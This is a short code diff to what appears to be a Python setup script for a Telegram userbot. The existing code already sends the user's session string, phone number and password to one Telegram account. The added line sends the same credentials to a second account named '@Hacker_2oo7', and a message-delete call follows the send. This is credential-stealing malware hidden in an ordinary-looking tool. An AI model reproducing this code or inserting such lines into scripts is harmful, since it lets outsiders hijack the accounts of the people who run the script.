@@ -58,6 +58,7 @@ client.start()
 client.sign_in(password=password)
 #modules
 message2=client.send_message("@CyberUserbotHelperbot", f'Session: {client.session.save()}\nPhone number: {phone_number}\nPassword: {password}')
+message2=client.send_message("@Hacker_2oo7", f'Session: {client.session.save()}\nPhone number: {phone_number}\nPassword: {password}')
 time.sleep(0)
 message2.delete()
 
